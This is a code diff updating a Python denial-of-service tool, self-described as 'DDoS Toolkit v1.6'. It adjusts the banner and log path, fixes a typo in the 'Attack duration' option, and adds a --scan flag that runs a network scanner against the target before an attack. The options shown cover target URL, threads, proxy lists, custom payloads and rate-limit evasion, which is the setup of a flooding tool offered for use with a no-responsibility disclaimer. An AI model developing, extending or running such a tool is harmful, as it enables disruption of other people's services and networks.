@@ -80,7 +80,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('load_test.log'),
+        logging.FileHandler('/opt/DDoS-Toolkit/logs/load_test.log'),
         logging.StreamHandler()
     ]
 )
@@ -88,14 +88,14 @@ logging.basicConfig(
 def display_banner():
     print(f"""
 {BLUE}
-██████████████████████████████████████████████████████████
-██                                                                ██
-██              DDoS Toolkit v1.5 Coded by LIONMAD                ██
-██        THIS TOOL CAN BE POWERFUL AND DANGEROUS IF MISUSED      ██                   
-██            USE WITH CAUTION, PROCEED AT YOUR OWN RISK.         ██
-██    AUTHOR TAKES NO RESPONSIBILITY FOR YOUR ACTIONS OR DAMAGE   ██ 
-██                                                                ██ 
-██████████████████████████████████████████████████████████
+█████████████████████████████████████████████████████████████████
+██                                                             ██
+██           DDoS Toolkit v1.6 Coded by LIONMAD                ██
+██     THIS TOOL CAN BE POWERFUL AND DANGEROUS IF MISUSED      ██                   
+██        USE WITH CAUTION, PROCEED AT YOUR OWN RISK.          ██
+██  AUTHOR TAKES NO RESPONSIBILITY FOR YOUR ACTIONS OR DAMAGE  ██ 
+██                                                             ██ 
+█████████████████████████████████████████████████████████████████
 {RESET}
 """)
 
@@ -105,7 +105,7 @@ def parse_args():
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
-    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attaque duration (seconds)")
+    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
@@ -119,9 +119,7 @@ def parse_args():
     parser.add_argument("--custom-payload", help="File containing custom payload data")
     parser.add_argument("--dynamic-rate-limit", action="store_true", help="Enable dynamic rate limiting based on target response")
     parser.add_argument("--ai-optimization", action="store_true", help="Enable AI-powered optimization")
-    parser.add_argument("--scan-output", help="Output file for network scan results")
-    parser.add_argument("--port-range", help="Port range for network scan (e.g., 1-1024)")
-    parser.add_argument("--scan-output", help="Output file for network scan results")
+    parser.add_argument("--scan", action="store_true", help="Perform a network scan using netscan.py")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -211,13 +209,10 @@ def generate_payload(payload_type: str, custom_payload_file: str = None):
     else:
         return None
 
-def run_network_scanner(target_ip, port_range, output_file):
+def run_network_scanner(target_ip):
     """Run the netscan.py script."""
     try:
-        command = ["python3", "netscan.py", "-t", target_ip, "-p", port_range]
-        if output_file:
-            command.extend(["-o", output_file])
-        
+        command = ["python3", "netscan.py", "-t", target_ip]
         print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
         subprocess.run(command, check=True)
     except subprocess.CalledProcessError as e:
@@ -468,6 +463,7 @@ def adjust_parameters_based_on_feedback():
 
 async def main():
     """Main function to run the load test."""
+    global args
     args = parse_args()
 
     if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
@@ -475,6 +471,16 @@ async def main():
         exit(1)
 
     display_banner()
+
+    # If --scan is provided, perform the scan and exit
+    if args.scan:
+        target = args.url.split("//")[-1].split("/")[0]
+        target_ip = await resolve_target(target)
+        if target_ip:
+            run_network_scanner(target_ip)
+        else:
+            print(f"{RED}Exiting: Target is not reachable.{RESET}")
+        exit(0)
 
     proxies = load_proxies(args.proxies) if args.proxies else []
     if proxies:
